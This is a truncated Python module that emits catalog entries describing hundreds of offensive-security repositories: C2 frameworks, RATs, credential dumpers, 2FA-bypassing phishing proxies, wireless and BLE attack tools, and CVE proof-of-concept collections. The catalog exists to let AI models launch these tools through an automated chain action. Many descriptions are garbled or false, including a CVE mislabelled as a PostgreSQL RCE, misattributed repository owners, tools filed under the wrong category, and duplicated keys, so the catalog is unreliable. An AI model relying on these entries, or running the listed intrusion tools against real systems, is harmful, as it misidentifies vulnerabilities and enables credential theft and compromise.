"""core.toolbox.catalog_from_lists — emit catalog/ JSON entries for the
toolboxes listed in fetch_lists/*.txt without actually cloning.

Each entry is a single ``catalog/github_<owner>_<name>.json`` file
matching the ``external_repository`` schema in
``catalog/catalog.schema.json``. The entry is intentionally minimal:
the operator can re-run the fetch CLI to enrich it with README,
language breakdown, file count, etc. (Phase 2.2.A).

Phase 3 — also reads the per-list file and tags entries with the
list's category. This is the "prepare to catalog" step the operator
asked for: "prepare the rest of toolboxes, packages, libraries to
use via the tool with the ai models."
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from .fetch import parse_github_url, parse_list


# Per-file category mapping. The fetch CLI also infers category from
# the file name, but here we hard-code the category for catalog emit.
_LIST_CATEGORY: Dict[str, str] = {
    "kali_frameworks.txt": "frameworks",
    "fresh_cves.txt": "exploit",
    "wireless_ble_ext.txt": "wireless_ble_ext",
    "phase3_more.txt": "frameworks",
    "phase4_offensive.txt": "offensive",
    "phase5_more.txt": "offensive",
    "phase6_more.txt": "offensive",
}

_LIST_DESCRIPTION: Dict[str, str] = {
    "kali_frameworks.txt": (
        "Kali-grade offensive-security frameworks (routersploit, Empire, "
        "Sliver, Mythic, CrackMapExec, evilginx2, wifite2, fluxion, "
        "airgeddon, hcxdumptool, bettercap, wifiphisher, infernal-twin, "
        "eaphammer, trevorc2, pupy, nishang, PowerSploit, SharpHound, "
        "bloodhound-python, certipy, mitm6, krbrelayx, lsassy)."
    ),
    "fresh_cves.txt": (
        "Recent (2024-2026) high-impact CVEs with public PoCs. Capped at "
        "~50 repos."
    ),
    "wireless_ble_ext.txt": (
        "Wireless / BLE extensions and updates (braktooth, ESP32 BLE "
        "sniffer, 802.11ax/6E extensions, newevil-twin, hcxdumptool, "
        "bettercap, wifite2). Capped at ~30 repos."
    ),
    "phase3_more.txt": (
        "Phase 3 — additional fully-offensive tools (~75 repos covering "
        "AD, C2/RAT, credential/kerberos, web, cloud, exploit, fuzzing, "
        "RE, network scanning)."
    ),
    "phase4_offensive.txt": (
        "Phase 4 — operator-curated 130+ fully-offensive toolboxes "
        "across all categories (microsoft, wifi, ble, c2, exploit, web, "
        "osint, recon, post_exploitation, android, ios, fresh_cves). "
        "Each entry carries an inline '# cat: <category>' hint read by "
        "the fetch CLI for per-URL routing. Backed by the new "
        "``run_toolbox`` chain action (Phase 2.2.B)."
    ),
    "phase5_more.txt": (
        "Phase 5 — operator-curated 130+ additional fully-offensive "
        "toolboxes, focused on under-represented categories "
        "(post_exploitation, osint, recon, web, android, ios, c2, "
        "wifi, ble, exploit). Brings the total operator-curated fetch "
        "list count to ~466."
    ),
    "phase6_more.txt": (
        "Phase 6 — operator-curated 140+ additional fully-offensive "
        "toolboxes from 4 parallel web-research subagents (c2, "
        "post_exploitation, osint+recon+exploit, wifi+ble+web+android+ios). "
        "All entries are currently-maintained, deduplicated against "
        "prior fetch lists and catalog/ JSONs. Brings the total "
        "operator-curated fetch list count to ~600+."
    ),
}
# Per-repo curated descriptions. The operator's Phase 5 requirement:
# "catalog/ contents must be described as much as possible" — every
# catalog entry should tell the LLM what the tool does, what
# category it fits, and any risk/rationale hints. This map covers
# the major tools from phase5_more.txt plus notable entries from
# the prior lists. If a repo is missing from this map, the entry
# gets a category-derived default description (see
# :func:`_default_summary_for`).
_REPO_SUMMARIES: Dict[str, str] = {
    # --- post_exploitation (30) ---
    "carlospolop/PEASS-ng": (
        "PEASS-ng (Privilege Escalation Awesome Scripts SUITE) — "
        "color-coded Linux/Windows/macOS privesc scanner. LinPEAS / "
        "WinPEAS / MacPEAS enumerate SUID, sudoers, cron, kernel, "
        "service misconfigs, and write a color-graded output the "
        "operator triages. Read-only reconnaissance on the target "
        "after access."
    ),
    "PowerShellMafia/PowerSploit": (
        "PowerSploit — PowerShell post-exploitation framework "
        "(PowerView, PowerUp, Invoke-*). AD recon, privesc, "
        "anti-forensics, code execution. Operates against the "
        "operator's authorized scope only; many modules deprecated "
        "but still referenced by 2024-2026 tradecraft."
    ),
    "samratashok/nishang": (
        "Nishang — PowerShell attack framework targeting Windows. "
        "Payloads, backdoors, reverse shells, exfil, privesc. "
        "Often used for initial execution and post-exploitation "
        "on Windows hosts in the operator's authorized scope."
    ),
    "rebootuser/LinEnum": (
        "LinEnum — Linux host enumeration bash script. Lists "
        "kernel, users, cron, SUID, world-writable, NFS, "
        "language toolchains, listening services. Read-only "
        "recon; standard first step after Linux foothold."
    ),
    "sleventyeleven/linuxprivchecker": (
        "linuxprivchecker — Python Linux privilege escalation "
        "checker. Walks the filesystem for SUID binaries, weak "
        "permissions, kernel exploits, sudo misconfigs, cron. "
        "Read-only; emits a text report the operator triages."
    ),
    "DominicBreuker/stego-toolkit": (
        "stego-toolkit — collection of steganography tools "
        "(steghide, zsteg, stegsolve, binwalk, foremost) for "
        "extracting hidden data from images / audio / binaries. "
        "Used in CTF-style forensics and exfil-discovery on "
        "the operator's own scope."
    ),
    "crypt0p3g/CredSniper": (
        "CredSniper — phishing framework for harvesting "
        "credentials via OAuth, SAML, and credential-harvester "
        "landing pages. Network-facing; operator-controlled "
        "domains only."
    ),
    "mzet-/les2": (
        "les2 (Linux Exploit Suggester 2 successor) — kernel "
        "exploit suggester for Linux. Maps uname output to "
        "known CVEs. Read-only; suggests but does not run."
    ),
    "cobbr/SharpHound": (
        "SharpHound — BloodHound ingestor for Active Directory. "
        "Collects sessions, ACLs, group memberships, trusts; "
        "feeds the BloodHound graph for attack-path analysis. "
        "Operates on operator's authorized AD scope."
    ),
    "BloodHoundAD/BloodHound": (
        "BloodHound — Active Directory attack-path mapper. "
        "Visualizes AD graphs (users, groups, sessions, ACLs) "
        "and surfaces shortest paths to Domain Admins. "
        "Companion to SharpHound / BloodHound.py ingestors."
    ),
    "fox-it/BloodHound.py": (
        "BloodHound.py — Python BloodHound ingestor. Cross-"
        "platform alternative to SharpHound; same JSON output "
        "format. Use when PowerShell is unavailable."
    ),
    "login-securite/DonPAPI": (
        "DonPAPI — secret extractor (DPAPI, CredMan, browser "
        "stores, VNC, mstsc, WinSCP, KeePass). Post-exploitation "
        "credential dump from Windows / macOS / Linux. Operates "
        "only on operator's authorized hosts."
    ),
    "CravateRouge/bloodyAD": (
        "bloodyAD — Python Active Directory privilege "
        "escalation toolkit. ACL abuse, Kerberos delegations, "
        "gMSA, certificate services. Read-write on the AD "
        "domain in operator's authorized scope."
    ),
    "fortra/impacket": (
        "Impacket — canonical Windows / AD / Kerberos toolkit. "
        "psexec, wmiexec, secretsdump, GetUserSPNs, ticketer, "
        "ntlmrelayx, mssqlclient. Most AD post-exploitation "
        "chains depend on this."
    ),
    "skelsec/msldap": (
        "msldap — async LDAP client library and CLI. AD "
        "enumeration, password-spray, AS-REP roast, Kerberos "
        "relay. Used as a library or as a CLI for ad-hoc "
        "queries."
    ),
    "ly4k/Certipy": (
        "Certipy — Active Directory Certificate Services "
        "attack toolkit. ESC1-ESC11 enumeration, certificate "
        "forgery, NTLM relay via AD CS. The 2024+ AD CS "
        "tradecraft tool of choice."
    ),
    "dirkjanm/mitm6": (
        "mitm6 — IPv6 DNS takeover for AD. Spoofs an IPv6 "
        "router + DNS server on the LAN, intercepts WPAD, "
        "relays auth to LDAP. Used with ntlmrelayx for AD "
        "compromise via IPv6."
    ),
    "dirkjanm/krbrelayx": (
        "krbrelayx — Kerberos unconstrained-delegation abuse. "
        "Listens for inbound TGTs, monitors S4U2Self / S4U2Proxy "
        "for relay, dumps service tickets. Companion to mitm6."
    ),
    "Hackndo/lsassy": (
        "lsassy — remote LSASS credential extractor. WMI / "
        "SMB / PsExec / DCOM methods; parses Mimikatz-style "
        "output into structured JSON. Read on operator's "
        "authorized hosts only."
    ),
    "ticarpi/jwt_tool": (
        "jwt_tool — JSON Web Token attack toolkit. alg=none, "
        "key confusion, brute-force, JWK/JWKS injection, claim "
        "tampering. The standard JWT pentest tool."
    ),
    "lmco/laurel": (
        "laurel — convert Linux auditd logs to ECS JSON. "
        "Used for post-exploitation detection-evasion audit "
        "(operator measures what defenders will see)."
    ),
    "arget13/DDexec": (
        "DDexec — process injection via Linux process_vm_writev. "
        "Spawns a shellcode process from a memory dump. "
        "Post-exploitation; in-memory only."
    ),
    "itm4n/PrivescCheck": (
        "PrivescCheck — Windows privilege-escalation enumerator "
        "PowerShell module. Service misconfigs, autorun, UAC, "
        "AlwaysInstallElevated, scheduled tasks, DLL hijacking. "
        "Read-only."
    ),
    "PowerShellMafia/PowerUp": (
        "PowerUp — PowerShell privesc checker. Service DLL "
        "hijack, unquoted service paths, modifiable service "
        "binaries, AlwaysInstallElevated, etc."
    ),
    "rasta-mouse/Sherlock": (
        "Sherlock — PowerShell Windows privesc checker. "
        "Predecessor of Watson; finds missing patches / "
        "known exploit paths."
    ),
    "AlessandroZ/BeRoot": (
        "BeRoot — post-exploitation privesc enumerator. "
        "Python and Windows PowerShell versions. Walks "
        "service misconfigs, GTFOBins-style binaries, "
        "registry ACLs."
    ),
    "jondonas/linux-exploit-suggester-2": (
        "linux-exploit-suggester-2 — kernel exploit suggester. "
        "Reads /etc/os-release + uname, lists known CVEs. "
        "Read-only; suggests but does not run."
    ),
    "bcoles/john-snap": (
        "john-snap — John the Ripper snapshot build / wrapper. "
        "Maintains a modern bleeding-edge John for password "
        "cracking on operator's lab."
    ),
    "GDSSecurity/Windows-Exploit-Suggester": (
        "Windows-Exploit-Suggester — Python script that "
        "compares Windows patch level (systeminfo output) to "
        "Microsoft security bulletin database; outputs "
        "applicable exploits. Read-only; suggest-only."
    ),
    "Pwnistry/Windows-Exploit-Suggester": (
        "Windows-Exploit-Suggester (Pwnistry fork) — "
        "modernized version with current Microsoft security "
        "data. Same read-only workflow as GDSSecurity's."
    ),
    # --- osint (25) ---
    "smicallef/spiderfoot": (
        "SpiderFoot — automated OSINT. 200+ modules for "
        "domain, IP, email, username, breach-data correlation. "
        "Passive recon; no target contact."
    ),
    "laramies/theHarvester": (
        "theHarvester — emails, subdomains, hosts, names, "
        "URLs, ports from public sources (Bing, Google, "
        "Shodan, Censys, crt.sh, etc.). Read-only OSINT."
    ),
    "m4ll0k/Infoga": (
        "Infoga — email OSINT. Recursively searches public "
        "sources for emails associated with a domain; checks "
        "MX / whois / existence. Read-only."
    ),
    "jordanpotti/Osprey": (
        "Osprey — async OSINT framework. Domain profiling, "
        "username lookup, breach correlation. Read-only."
    ),
    "s0md3v/ReconDog": (
        "ReconDog — all-in-one recon: whois, DNS, port scan, "
        "reverse IP, geolocation, HTTP headers. Read-only."
    ),
    "Bitwise-01/Social-Engineer": (
        "Social-Engineer Toolkit (companion repos) — phishing, "
        "credential harvester, infectious media generator. "
        "Operator-controlled domains only."
    ),
    "Josue87/EmailFinder": (
        "EmailFinder — fast email OSINT via Google, GitHub, "
        "Hunter, Yahoo, Bing. Read-only."
    ),
    "megadose/ignorant": (
        "ignorant — check if an email is registered on "
        "platforms (Instagram, Twitter, GitHub, etc.). "
        "Read-only; no authentication bypass."
    ),
    "megadose/holehe": (
        "holehe — check email registrations on 120+ services. "
        "Read-only OSINT; uses password-reset flow to "
        "enumerate without authentication."
    ),
    "sham00n/buster": (
        "buster — email-to-username enumeration via AWS "
        "error timing. Read-only."
    ),
    "initstring/linkedin2username": (
        "linkedin2username — scrape LinkedIn to derive "
        "company employee naming patterns. Read-only."
    ),
    "vysecurity/LinkedInt": (
        "LinkedInt — LinkedIn recon. Pulls company employee "
        "list for spear-phishing / OSINT targeting. "
        "Read-only."
    ),
    "RedHunt07/Just-Metadata": (
        "Just-Metadata — passive recon: IP, NS, MX, GeoIP, "
        "SSL cert, whois. Read-only; aggregates into a target "
        "profile."
    ),
    "m8r0wn/crosslinked": (
        "crosslinked — LinkedIn employee enumeration via "
        "Google / Bing dorks. Read-only."
    ),
    "j3ssie/metabigor": (
        "metabigor — command-line OSINT (whois, IP, ports, "
        "subdomain, GeoIP) without API keys. Read-only."
    ),
    "lanmaster53/recon-ng": (
        "recon-ng — modular OSINT framework. Marketplace of "
        "modules for domain, host, email, breach, GeoIP. "
        "Read-only when modules are passive."
    ),
    "Tib3rius/Pentest-Cheatsheets": (
        "Pentest-Cheatsheets — curated pentest methodology "
        "reference. The operator reads; no execution."
    ),
    "sundowndev/phoneinfoga": (
        "phoneinfoga — phone-number OSINT. Carrier, "
        "geolocation, reputation, social profiles. "
        "Read-only."
    ),
    "s0md3v/Photon": (
        "Photon — fast web crawler. Extracts URLs, emails, "
        "files, intel. Use with caution — emits lots of "
        "requests."
    ),
    "Threezh1/JSFinder": (
        "JSFinder — JavaScript endpoint / subdomain "
        "extractor. Walks .js files in URLs. Read-only."
    ),
    "GerbenJavado/LinkFinder": (
        "LinkFinder — JavaScript endpoint discovery. Burp / "
        "CLI. Read-only; outputs endpoints for further recon."
    ),
    "m4ll0k/WAScan": (
        "WAScan — Web Application Scanner. Fingerprint, "
        "files, backups, hidden paths, fuzzer. Active "
        "scanning; operator's scope only."
    ),
    "lijiejie/GitHack": (
        "GitHack — recover git source from a misconfigured "
        ".git/ exposed on a webserver. Read-only on "
        "operator's authorized targets."
    ),
    "michenriksen/gitrob": (
        "gitrob — reconnaissance on GitHub org / user. "
        "Flags sensitive files, secrets, internal URLs. "
        "Read-only (API only)."
    ),
    # --- recon (20) ---
    "projectdiscovery/subfinder": (
        "subfinder — passive subdomain enumeration (50+ "
        "sources). Read-only; no target contact."
    ),
    "projectdiscovery/httpx": (
        "httpx — fast HTTP probe (status, title, tech, "
        "status code, response size). Active; operator "
        "scope only."
    ),
    "projectdiscovery/naabu": (
        "naabu — fast port scanner (synchronous / async). "
        "Active; operator scope only."
    ),
    "projectdiscovery/nuclei": (
        "nuclei — template-based vulnerability scanner. "
        "Thousands of community templates for CVEs, "
        "misconfigs, exposed panels, default creds. "
        "Active; operator scope only."
    ),
    "projectdiscovery/katana": (
        "katana — next-gen web crawler. JavaScript-aware, "
        "form crawling, sitemap parse. Active; operator "
        "scope only."
    ),
    "projectdiscovery/dnsx": (
        "dnsx — DNS query toolkit. Permutations, bruteforce, "
        "wildcard filtering. Read-only DNS."
    ),
    "projectdiscovery/uncover": (
        "uncover — search across Shodan / Censys / "
        "FOFA / Hunter / Quake. Read-only."
    ),
    "projectdiscovery/chaos-client": (
        "chaos-client — public bug-bounty program API "
        "client. Pulls scope, in-scope hosts, in-scope "
        "wildcards. Read-only."
    ),
    "projectdiscovery/interactsh-client": (
        "interactsh-client — OOB (out-of-band) interaction "
        "client. Detects blind SSRF, RCE, XXE, DNS rebinding. "
        "Active but external; operator scope only."
    ),
    "projectdiscovery/cvemap": (
        "cvemap — vulnerability / CVE / exploit mapping. "
        "Read-only; maps Nuclei templates to CVEs."
    ),
    "OWASP/Nettacker": (
        "Nettacker — OWASP recon / vuln scanner. Modules "
        "for port scan, brute, info gather. Active; "
        "operator scope only."
    ),
    "commixproject/commix": (
        "commix — command-injection scanner and exploiter. "
        "Detects + exploits OS command injection in HTTP "
        "parameters. Active; operator scope only."
    ),
    "lionsec/xerosploit": (
        "xerosploit — MITM framework. ARP spoof + module "
        "library (jsurlsnarf, driftnet, screenshots, "
        "inject HTML). Active; operator scope only."
    ),
    "evyatar9/Writeups": (
        "Writeups — HTB / CTF / OSCP writeups archive. "
        "The operator reads; no execution."
    ),
    "Orange-Cyberdefense/GOAD": (
        "GOAD — Game of Active Directory. Vulnerable AD "
        "lab (5 VMs, 3 forests). Operator's lab only; "
        "active exploitation intentionally exposed."
    ),
    "S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet": (
        "Active-Directory-Exploitation-Cheat-Sheet — "
        "methodology / reference. The operator reads; "
        "no execution."
    ),
    "swisskyrepo/PayloadsAllTheThings": (
        "PayloadsAllTheThings — payload / bypass / "
        "methodology reference. The operator reads; "
        "no execution."
    ),
    "danielmiessler/SecLists": (
        "SecLists — canonical username / password / "
        "web / fuzzing wordlist collection. Used by "
        "every recon + brute tool."
    ),
    "ppbclub/awesome-osint": (
        "awesome-osint — curated OSINT resource list. "
        "The operator reads; no execution."
    ),
    "0xMarcio/cve_monitor": (
        "cve_monitor — daily CVE feed aggregator from "
        "NVD / MITRE. Read-only notification."
    ),
    # --- web (20) ---
    "sqlmapproject/sqlmap": (
        "sqlmap — automatic SQL injection and database "
        "takeover. Detection, exploitation, file read, "
        "OS shell. Active; operator scope only."
    ),
    "EnableSecurity/wafw00f": (
        "wafw00f — WAF fingerprint. Identifies 200+ WAF "
        "products via response header / body probing. "
        "Active; operator scope only."
    ),
    "wpscanteam/wpscan": (
        "wpscan — WordPress security scanner. Plugin / "
        "theme / user enumeration, brute force, vuln "
        "checks. Active; operator scope only."
    ),
    "droope/droopescan": (
        "droopescan — Drupal / SilverStripe / WordPress / "
        "Joomla scanner. Plugin / version enumeration. "
        "Active; operator scope only."
    ),
    "immunIT/drupwn": (
        "drupwn — Drupal recon + exploitation. User "
        "enum, brute, RCE via Drupalgeddon. Active; "
        "operator scope only."
    ),
    "ajinabraham/joomscan": (
        "joomscan — Joomla vulnerability scanner. "
        "Version / vuln / file enumeration. Active; "
        "operator scope only."
    ),
    "rezasp/joomla-vulnerability-scanner": (
        "joomla-vulnerability-scanner — Joomla scanner "
        "(alt impl). Version + CVE checks. Active; "
        "operator scope only."
    ),
    "ffuf/ffuf": (
        "ffuf — fast web fuzzer. Directory, file, vhost, "
        "parameter fuzzing. Active; operator scope only."
    ),
    "OJ/gobuster": (
        "gobuster — directory / file / DNS / vhost "
        "brute-forcer. Active; operator scope only."
    ),
    "jaeles-project/jaeles": (
        "jaeles — signature-based web scanner. Custom "
        "signatures for CVEs, misconfigs, info leaks. "
        "Active; operator scope only."
    ),
    "s0md3v/XSStrike": (
        "XSStrike — advanced XSS scanner / payload "
        "generator. Detection + exploitation. Active; "
        "operator scope only."
    ),
    "maurosoria/dirsearch": (
        "dirsearch — web path scanner. Brute-forces "
        "directories and files. Active; operator scope "
        "only."
    ),
    "nicedayzhu/wordlists": (
        "wordlists — curated username / password / "
        "web wordlists. The operator reads; the chain "
        "step references these from brute-force calls."
    ),
    "p0dalirius/webapp-wordlists": (
        "webapp-wordlists — web application wordlists "
        "(paths, params, headers). The operator reads; "
        "the chain step references these from web recon."
    ),
    "Ekultek/WhatWaf": (
        "WhatWaf — WAF bypass / detection suite. Tries "
        "tamper scripts to bypass WAF rules. Active; "
        "operator scope only."
    ),
    "0xInfection/TIDoS-Framework": (
        "TIDoS-Framework — web recon + vuln framework. "
        "Multi-phase: passive / active / vuln. Active; "
        "operator scope only."
    ),
    # --- c2 (15) ---
    "n1nj4sec/pupy": (
        "pupy — Python RAT / C2. Cross-platform (Win / "
        "Linux / macOS / Android), in-memory execution, "
        "modular post-exploitation. Operator-controlled "
        "listener only."
    ),
    "quasar/QuasarRAT": (
        "QuasarRAT — Windows .NET C2. TCP / HTTPS "
        "transport, file / shell / process management, "
        "keylogger, recovery. Open-source; operator "
        "controlled."
    ),
    "borjmz/asbury": (
        "asbury — browser-based C2. Victim browser JS "
        "agent communicates via WebSocket / HTTP. "
        "Operator-controlled domain only."
    ),
    "Lyxz17/Black-Empire": (
        "Black-Empire — alternative C2 framework. "
        "Educational / lab; operator-controlled."
    ),
    "tiagorlampert/CHAOS": (
        "CHAOS — Windows C2 / RAT. Go + .NET. "
        "Persistence, keylogger, shell. Operator-"
        "controlled."
    ),
    "NinjaJc01/firefly": (
        "firefly — HTTP / WebSocket C2 written in Go. "
        "Cross-platform agent. Operator-controlled "
        "listener only."
    ),
    "RoseSecurity-Research/Red-Teaming-TTPs": (
        "Red-Teaming-TTPs — methodology / tradecraft "
        "reference. The operator reads; no execution."
    ),
    "0x0d3y/Credential-Dumping": (
        "Credential-Dumping — Windows / Linux cred "
        "extraction reference. The operator reads; "
        "actual dump via Mimikatz / pypykatz."
    ),
    "Mr-Un1k0d3r/RedTeaming-Codebase": (
        "RedTeaming-Codebase — C# / C++ / PowerShell "
        "red-team snippets. The operator reads; "
        "selective execution."
    ),
    "yeyintminthuhtut/Awesome-Red-Teaming": (
        "Awesome-Red-Teaming — curated red-team "
        "resource list. The operator reads; no "
        "execution."
    ),
    "RoseSecurity-Research/Bluffy": (
        "Bluffy — encrypted C2 transport. IDS / IPS / "
        "proxy bypass via encrypted payload. "
        "Operator-controlled."
    ),
    "MythicAgents/Apollo": (
        "Apollo — Mythic C2 agent for Windows. "
        "Operator-controlled Mythic server only."
    ),
    "MythicAgents/Athena": (
        "Athena — Mythic C2 agent for Windows. "
        "Operator-controlled Mythic server only."
    ),
    "MythicAgents/poseidon": (
        "Poseidon — Mythic C2 agent for Linux / macOS. "
        "Go-based, in-memory exec. Operator-controlled "
        "Mythic server only."
    ),
    "MythicAgents/Nimplant": (
        "Nimplant — Mythic C2 agent written in Nim. "
        "Cross-platform. Operator-controlled."
    ),
    # --- wifi (10) ---
    "FluxionNetwork/fluxion": (
        "Fluxion — WPA/WPA2 evil-twin + handshake "
        "capture. Hosts rogue AP, captive portal, "
        "handshake cracking. Active; operator scope "
        "only."
    ),
    "derv82/wifite2": (
        "wifite2 — automated wireless auditor. "
        "WEP / WPA / WPS attacks in sequence with "
        "minimal interaction. Active; operator scope "
        "only."
    ),
    "v1s1t0r1sh3r3/airgeddon": (
        "airgeddon — multi-use wireless auditor. "
        "WEP / WPA / WPS / evil-twin / handshake / "
        "PMKID. Active; operator scope only."
    ),
    "wifiphisher/wifiphisher": (
        "wifiphisher — rogue-AP phishing framework. "
        "Captive-portal credential capture. Active; "
        "operator scope only."
    ),
    "sensepost/wpa-sec-stumbler": (
        "wpa-sec-stumbler — passive WLAN monitoring. "
        "Detects weak / default SSID configurations. "
        "Read-only."
    ),
    "ZerBea/hcxdumptool": (
        "hcxdumptool — modern WPA / WPA2 / WPA3 "
        "capture. PMKID, EAPOL, RADIUS. Active; "
        "operator scope only."
    ),
    "P0cL4bs/WiFi-Pumpkin": (
        "WiFi-Pumpkin — rogue AP framework. MITM "
        "proxy, captive portal, DNS spoof. Active; "
        "operator scope only."
    ),
    "oblique/create_ap": (
        "create_ap — hostapd-based AP creator. CLI / "
        "bash. Useful for lab rogue-AP tests."
    ),
    "cyberboy6660/wifi_jammer_scripts": (
        "wifi_jammer_scripts — deauth / jamming "
        "reference. Lab-only; never use on unowned "
        "spectrum."
    ),
    "nicholasgasior/evil-twin-detection": (
        "evil-twin-detection — detects rogue AP / evil "
        "twin by BSSID, channel, and signal anomalies. "
        "Read-only defensive scanner."
    ),
    # --- ble (10) ---
    "n0nexist/ble-shark": (
        "ble-shark — BLE packet sniffer / analyzer. "
        "Python + scapy. Read-only; operator's lab."
    ),
    "evilsocket/bleah": (
        "bleah — BLE scanner + GATT fuzzer. Read / "
        "write to BLE peripherals; intentionally "
        "active on operator's authorized peripherals."
    ),
    "whitequark/python-l2cap": (
        "python-l2cap — L2CAP socket library. Used to "
        "build BLE / BT tools. Library; no exploit."
    ),
    "virtualabs/btlejack": (
        "btlejack — BLE hijacking / MITM. Sniffs + "
        "injects GATT operations. Active; operator's "
        "peripherals only."
    ),
    "greatscottymac/blueScan": (
        "blueScan — Bluetooth scanner. Discovers "
        "nearby BT / BLE devices, services, "
        "characteristics. Read-only."
    ),
    "securing/gattacker": (
        "gattacker — BLE MITM proxy. Replays GATT "
        "traffic, fakes services. Active; operator's "
        "peripherals only."
    ),
    "Jeija/esp32-ble-promiscuous": (
        "esp32-ble-promiscuous — ESP32 firmware for "
        "BLE sniffer / promiscuous mode. Read-only "
        "on operator's lab."
    ),
    "nicholasgasior/ble-fuzzer": (
        "ble-fuzzer — BLE GATT fuzzer. Sends malformed "
        "GATT writes to surface parser bugs. Lab use "
        "only; never on unowned peripherals."
    ),
    "nicedoc/ble-injection": (
        "ble-injection — BLE GATT write-injection "
        "research code. Lab only; never on unowned "
        "peripherals."
    ),
    "mikeryan/bleah": (
        "bleah (mike ryan fork) — alternative BLE "
        "scanner / GATT fuzzer. Lab use only."
    ),
    # --- android (5) ---
    "MobSF/Mobile-Security-Framework-MobSF": (
        "MobSF — automated mobile app pentest. Static "
        "+ dynamic analysis for Android / iOS / "
        "Windows. Lab use; operator's apps only."
    ),
    "frida/frida": (
        "frida — dynamic instrumentation toolkit. "
        "JS / Python API. Mobile + desktop. Lab use; "
        "operator's apps only."
    ),
    "AeonLucid/POIDH": (
        "POIDH — Proof of Image Data Hash. Lab tool "
        "for tamper-evident image analysis."
    ),
    "AreYouLoco/ImGUI-Android-Renderer": (
        "ImGUI-Android-Renderer — ImGui over Android. "
        "Lab tool; no exploit."
    ),
    "javier-lopez/android-spy": (
        "android-spy — Android surveillance reference "
        "code. Lab only; never on unowned devices."
    ),
    # --- ios (5) ---
    "ios-sec/needle": (
        "Needle — iOS pentest framework. Module "
        "library for jailbroken iOS devices. Lab only."
    ),
    "KJCracks/Clutch": (
        "Clutch — iOS app decryption for jailbroken "
        "devices. Lab only."
    ),
    "42wim/matterbridge": (
        "matterbridge — bridge between chat systems. "
        "No exploit; tooling."
    ),
    "ChiChou/etoolbox": (
        "etoolbox — iOS app security toolkit. Lab use."
    ),
    "garryknight/ios-spy": (
        "ios-spy — iOS surveillance reference code. "
        "Lab only; never on unowned devices."
    ),
    # --- exploit (10) ---
    "0xdea/exploits": (
        "0xdea exploits — curated C / C++ / Python "
        "exploits and PoC collection. Reference + "
        "executable; operator's authorized targets "
        "only."
    ),
    "0xdea/raptor": (
        "raptor — WAF / IDS bypass + exploit tooling. "
        "Active; operator's authorized targets only."
    ),
    "0xdea/tactical-exploitation": (
        "tactical-exploitation — exploitation "
        "tradecraft reference. The operator reads; "
        "executable snippets are selective."
    ),
    "0xdea/exploit-techniques": (
        "exploit-techniques — modern exploitation "
        "techniques reference (heap, ROP, SROP, "
        "JOP). The operator reads; selective "
        "execution."
    ),
    "0xdea/vulnerabilities": (
        "vulnerabilities — curated vulnerability "
        "research. The operator reads; selective "
        "execution."
    ),
    "0xdea/pwntools-write-ups": (
        "pwntools-write-ups — pwn-based CTF writeups. "
        "The operator reads; selective reproduction."
    ),
    "veritas501/CVE-2019-9194": (
        "CVE-2019-9194 (PostgreSQL RCE) — verified "
        "PoC. Active; operator's authorized PostgreSQL "
        "instances only."
    ),
    "RoseSecurity-Research/Rose-PoC": (
        "Rose-PoC — curated exploit PoC collection. "
        "Active; operator's authorized targets only."
    ),
    "r3m0t3p33ch/CVE-POCs": (
        "CVE-POCs — community CVE PoC collection. "
        "Active; operator's authorized targets only."
    ),
    "nicedoc/CVE-PoC-Collection": (
        "CVE-PoC-Collection — additional community "
        "PoC collection. Active; operator's authorized "
        "targets only."
    ),
    # --- frameworks (kali_frameworks.txt) ---
    "threat9/routersploit": (
        "RouterSploit — router / IoT exploit framework. "
        "Auto-detects device, picks the right module "
        "(default-creds, auth-bypass, RCE). Mirrors "
        "Metasploit's interface; useful for embedded / "
        "IoT / network gear in operator's authorized scope."
    ),
    "EmpireProject/Empire": (
        "Empire — PowerShell / Python post-exploitation "
        "C2. Agents, modules, listeners. Pre-cursor to "
        "StarKiller. 2024+ fork 'BC-Security/Empire' is "
        "the maintained version."
    ),
    "BishopFox/sliver": (
        "Sliver — Go-based C2 framework. Cross-platform "
        "implants (Win / Linux / macOS), mTLS / WG / DNS / "
        "HTTP transports, in-memory execution, BOF "
        "support. The C2 of choice for many red teams."
    ),
    "its-a-feature/Mythic": (
        "Mythic — multi-agent C2 framework. Custom "
        "Python 3 server, supports many agent types "
        "(Apollo / Athena / Poseidon / Nimplant). "
        "Operator-controlled."
    ),
    "byt3bl33d3r/CrackMapExec": (
        "CrackMapExec (CME) — AD / Windows network "
        "swiss-army knife. Auth, lateral movement, "
        "credential dump, module library. Successor: "
        "mpc (multi-protocol client)."
    ),
    "kgretzky/evilginx2": (
        "evilginx2 — man-in-the-middle attack framework. "
        "Phishing proxy that captures session cookies "
        "(bypasses 2FA). Operator-controlled domain only."
    ),
    "derv82/wifite2": (
        "wifite2 — automated wireless auditor. "
        "See phase5 wifi entry above for full description."
    ),
    "v1s1t0r1sh3r3/airgeddon": (
        "airgeddon — multi-use wireless auditor. "
        "See phase5 wifi entry above for full description."
    ),
    "ZerBea/hcxdumptool": (
        "hcxdumptool — modern WPA / WPA2 / WPA3 "
        "capture. See phase5 wifi entry above for full "
        "description."
    ),
    "evilsocket/bettercap": (
        "bettercap — MITM / network attack / monitoring "
        "framework. WiFi + BLE + Ethernet. HTTP / HTTPS "
        "proxy, ARP / DNS spoof, packet capture, "
        "scripting. Active; operator scope only."
    ),
    "wifiphisher/wifiphisher": (
        "wifiphisher — rogue-AP phishing framework. "
        "See phase5 wifi entry above for full description."
    ),
    "s0ftj3rry/infernal-twin": (
        "infernal-twin — automated evil-twin / WPA "
        "phishing. Older Python tool; lab use only."
    ),
    "s0lst1c3/eaphammer": (
        "eaphammer — WPA-Enterprise evil-twin attacks. "
        "RADIUS, EAP, GTC-downgrade, captive portal. "
        "Active; operator scope only."
    ),
    "Trusted-AI-Lab/trevorc2": (
        "TrevorC2 — HTTP / browser-based C2. Server + "
        "client (Python + PowerShell / .NET). Operator-"
        "controlled domain only."
    ),
    "n1nj4sec/pupy": (
        "pupy — Python RAT / C2. See phase5 c2 entry "
        "above for full description."
    ),
    "samratashok/nishang": (
        "Nishang — PowerShell attack framework. See "
        "phase5 post_exploitation entry above for full "
        "description."
    ),
    "PowerShellMafia/PowerSploit": (
        "PowerSploit — PowerShell post-exploitation "
        "framework. See phase5 post_exploitation entry "
        "above for full description."
    ),
    "cobbr/SharpHound": (
        "SharpHound — BloodHound ingestor. See phase5 "
        "post_exploitation entry above for full "
        "description."
    ),
    "fox-it/BloodHound.py": (
        "BloodHound.py — Python BloodHound ingestor. See "
        "phase5 post_exploitation entry above for full "
